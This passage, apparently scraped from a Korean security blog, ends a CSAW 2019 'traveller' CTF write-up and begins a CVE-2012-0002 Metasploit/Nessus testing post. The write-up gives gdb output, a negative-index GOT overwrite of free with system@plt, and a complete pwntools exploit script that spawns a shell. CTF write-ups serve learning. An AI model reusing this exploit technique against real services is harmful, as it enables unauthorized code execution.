operator\">&lt;</span>change<span class=\"token operator\">+</span><span class=\"token number\">103</span><span class=\"token operator\">></span>    mov    rax<span class=\"token punctuation\">,</span> qword ptr <span class=\"token punctuation\">[</span>rax<span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x6020c0</span><span class=\"token punctuation\">]</span>\n ► <span class=\"token number\">0x400c65</span> <span class=\"token operator\">&lt;</span>change<span class=\"token operator\">+</span><span class=\"token number\">111</span><span class=\"token operator\">></span>    mov    qword ptr <span class=\"token punctuation\">[</span>rbp <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> rax\n\ngdb<span class=\"token operator\">-</span>peda$ p<span class=\"token operator\">/</span><span class=\"token function\">d</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x401f30</span><span class=\"token operator\">-</span><span class=\"token number\">0x6020c0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">8</span>\n$<span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">262194</span>\ngdb<span class=\"token operator\">-</span>peda$</code></pre></div>\n<ul>\n<li>trips 구조체의 크기만큼 증가하여 주소 번지를 이동하기 때문에 우리는 해당 <code class=\"language-text\">(0x40df30-0x6020c0)/8</code> , -262194 를 choice 변수의 값으로 사용하여 <code class=\"language-text\">0x401f30</code> 주소 로 점프한다.</li>\n<li>그후에 <code class=\"language-text\">free@plt+6</code> 주소에 참조가 가능하여 해당 영역에 우리는 system@plt+6 주소를 덮어써 free@got가 호출될 때 해당 system@plt+6부분이 실행된다.</li>\n</ul>\n<h2 id=\"exploit-code\" style=\"position:relative;\"><a href=\"#exploit-code\" aria-label=\"exploit code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit code</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>        \n    <span class=\"token comment\"># context.log_level = 'debug'</span>\n    <span class=\"token comment\"># context.arch = 'amd64'</span>\n\n    LOCAL <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    DEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n    s       <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>       \n    sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    r       <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> num<span class=\"token operator\">=</span><span class=\"token number\">4096</span>           <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n    rn      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>  <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span> drop<span class=\"token punctuation\">)</span>\n    irt     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data   <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data   <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    leak    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span> addr <span class=\"token punctuation\">:</span>log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">'{} : {:#x}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> LOCAL<span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#p = process('./pwn',env={'LD_PRELOAD':'./libc-2.23.so'})</span>\n        p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./traveller'</span><span class=\"token punctuation\">)</span>\n        l <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.23.so'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'_._._._'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8000</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># e = ELF('____')</span>\n        <span class=\"token comment\"># libc = ELF('./libc-2.27.so')</span>\n        <span class=\"token comment\">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span> des<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> ru<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> ru<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>des<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">Change</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span> des<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>des<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">Delete</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">Check</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n            \n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello! Welcome to trip management system. \\n\"</span><span class=\"token punctuation\">)</span>\n    argc_stack <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n    leak<span class=\"token punctuation\">(</span><span class=\"token string\">\"argc@stack : \"</span><span class=\"token punctuation\">,</span> argc_stack<span class=\"token punctuation\">)</span>\n    Add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span>\n    Change<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">262194</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x400716</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    Delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>      \n    irt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"get-flag\" style=\"position:relative;\"><a href=\"#get-flag\" aria-label=\"get flag permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>get flag</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 620px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAfElEQVQI13XLSRKCMBBAUS6iOGYgIWk6kU4YRIJaJQvufxy1XKpVf/lfNl6udE4l1sp664MLnQKvwBkXkRofe42nLZP5QXyXpcdym5d0n0M/IrVIHbUD1A3XwHUlDDJlN8c/OA4TVyANirKS7xUK41hhVzv2ab3nP+ULPwH8ER9ngIsa1wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/7640167246cbae94ea33c5c614dbd056/2a195/1.png\"\n        srcset=\"/static/7640167246cbae94ea33c5c614dbd056/e9ff0/1.png 180w,\n/static/7640167246cbae94ea33c5c614dbd056/f21e7/1.png 360w,\n/static/7640167246cbae94ea33c5c614dbd056/2a195/1.png 620w\"\n        sizes=\"(max-width: 620px) 100vw, 620px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\">바이너리 개요</a></li>\n<li><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\">보호기법</a></li>\n<li><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">main 함수 분석</a></li>\n<li><a href=\"#add-%ED%95%A8%EC%88%98\">add 함수</a></li>\n<li><a href=\"#change-%ED%95%A8%EC%88%98\">change 함수</a></li>\n<li><a href=\"#delete-%ED%95%A8%EC%88%98\">delete 함수</a></li>\n<li><a href=\"#gettrip-%ED%95%A8%EC%88%98\">getTrip 함수</a></li>\n<li><a href=\"#exploit-idea\">Exploit Idea</a></li>\n<li><a href=\"#freeplt6\">free@plt+6</a></li>\n<li><a href=\"#exploit-code\">exploit code</a></li>\n<li><a href=\"#get-flag\">get flag</a></li>\n</ul>\n</div>","frontmatter":{"date":"September 18, 2020","title":"CSAW 2019 traveller 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🍚"},"fields":{"slug":"/csaw2019_travelle_ctf_writeup/"}},"prev":{"id":"74aeb365-aacf-5fdf-b30f-88959a928ba3","html":"<h1 id=\"취약점-분석-보고서-cve-2012-0002\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EB%B3%B4%EA%B3%A0%EC%84%9C-cve-2012-0002\" aria-label=\"취약점 분석 보고서 cve 2012 0002 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석 보고서 CVE-2012-0002</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 546px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 163.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,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'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image000\"\n        title=\"image000\"\n        src=\"/static/ad564f14a629de93a30250d1aba9cd59/76aed/image000.png\"\n        srcset=\"/static/ad564f14a629de93a30250d1aba9cd59/e9ff0/image000.png 180w,\n/static/ad564f14a629de93a30250d1aba9cd59/f21e7/image000.png 360w,\n/static/ad564f14a629de93a30250d1aba9cd59/76aed/image000.png 546w\"\n        sizes=\"(max-width: 546px) 100vw, 546px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"metasploit-취약성-테스트\" style=\"position:relative;\"><a href=\"#metasploit-%EC%B7%A8%EC%95%BD%EC%84%B1-%ED%85%8C%EC%8A%A4%ED%8A%B8\" aria-label=\"metasploit 취약성 테스트 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Metasploit 취약성 테스트</h2>\n<h3 id=\"nessus-db-정보-내보내기\" style=\"position:relative;\"><a href=\"#nessus-db-%EC%A0%95%EB%B3%B4-%EB%82%B4%EB%B3%B4%EB%82%B4%EA%B8%B0\" aria-label=\"nessus db 정보 내보내기 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Nessus DB 정보 내보내기</h3>\n<p>Metasploit Exploit Framework를 통해 대상 서비스 취약성 점검을 하기 위해\nNessus를 바탕으로 점검한 결과를 DB 형태로 내보내기를 진행 파일은 xml\n유형의 Nessus 확장자 구성으로 되어있으며 해당 파일일 작업 공간에 저장\n한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAClklEQVQoz2WR3UvTURjHjy9R9AcEeVMUhGa6+bb5si3XNKcmSUZQkYgaKWhQN10VKdRF9FcEXRd1011BeREKuiGViTnnNmNs+73v99t+5zzfOEMh64EvX55znvN5nofDvsZ/nN3a2qpTVfVDJpNBMpnkuVwOQghks1mkUqmKG4YB13Wxs7MDWacoCnbTaSyvrCAWj2MtFkNBUcDyiip0wxCGaVGhUEA+nyf5WAJVVYWEm6YJx3EqQJnLOtu2SdndxbeVFbG1vu7ubW5yM5vlzNBVaLpeKQZA2A8J/DuI6P8zRaH89ja0dBo8lwPpOpicSMqyLCqXyxJMEi4l8wOIBB64PHccR9i2jb1MJvVzY+NNMpl8L4R4xxRFISkJlV4sFqlUKtH+inRoyH2XzS3LcjnnMn9VNE22sb7OhBCMGbruGoZRkWWarqIo/Mnicxq7OY67s/dp8t4cpmbmMT07TzduT2Bm7gFtJxJc0zRHbiGEeA2AaZpWKzivZkWnBLtUhmWX4JQ5dMPArfEptPiD5PUH0dTejdP1zTh1rgl1Z+rJH4pgO5GofJRcnYjeEhHjnFdLZyVOCw6nhWKZL3LgqaYbz6Ij135fjEQxGB0RfZFBBHrCCATC1N7WhWCoT1+LxV86tv1YCPECwHU5IYAq6cwsEzNKghHAvv9KygvW1hNeHR0exdjwKB+NXsVw3xCGIoNisHcA/d29KcbYsY9fltg+6JCY6bg1huPWLC2v1soudyamj3t8wXigtx/+rhBv9vrgafHD29opmlo7caG1MxMauHKSMcY+fV46QkTVh4AH0djiZ56OAPP4gkfPe32xek8HGrw+3uD1obGtC76esJgMX8Z8JJp50NF54pG/mz0MXapi/8QfSUWKnJOd3hIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image8\"\n        title=\"image8\"\n        src=\"/static/d48f22e3a3d38f69a2e77d01f6152b95/d8f62/image8.png\"\n        srcset=\"/static/d48f22e3a3d38f69a2e77d01f6152b95/e9ff0/image8.png 180w,\n/static/d48f22e3a3d38f69a2e77d01f6152b95/f21e7/image8.png 360w,\n/static/d48f22e3a3d38f69a2e77d01f6152b95/d8f62/image8.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"metasploit-workspace\" style=\"position:relative;\"><a href=\"#metasploit-workspace\" aria-label=\"metasploit workspace permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Metasploit workspace</h3>\n<p>Metasploit 상에 취약점 점검 대상의 정보를 관리하기 위해 Nessus DB정보를\n받아와 작업할 공간을 만든다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.888888888888886%; position: relative; bottom: 0; left: 0; background-image: 